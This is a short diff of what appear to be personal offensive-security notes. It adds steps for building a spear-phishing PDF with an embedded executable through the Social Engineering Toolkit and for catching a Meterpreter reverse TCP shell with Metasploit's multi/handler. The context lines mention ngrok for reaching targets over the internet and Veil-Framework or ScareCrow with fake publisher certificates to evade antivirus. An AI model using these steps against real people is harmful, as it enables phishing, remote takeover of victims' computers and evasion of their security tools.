@@ -35,5 +35,16 @@ search > searching of expiot,auxiliary,nops,payloads,posts
         run
     note:- For WAN use portfordwing tools ngrock
     to bypass anti-virous, add fake publisher certificate use veil-framework, ScareCrow 
----------------------------------------------------------------------------------------------------------------
-netexpose framework
+---------------------------------------------------------------------------------------------------------------------------
+WAY 2
+use tool settoolkit
+    > sudo ./settoolkit
+    > select options for generate payload   
+        example, >Spear-Phishing Attack Vectors >Create a FileFormat Payload> Adobe PDF Embedded EXE Social Engineering
+    > Use metaspolite listenr to open session
+        use exploit/multi/handler
+        set payload windows/x64/meterpreter/reverse_tcp
+        set LHOST
+        set LPORT
+        run
+----------------------------------------------------------------------------------------------------------------------------
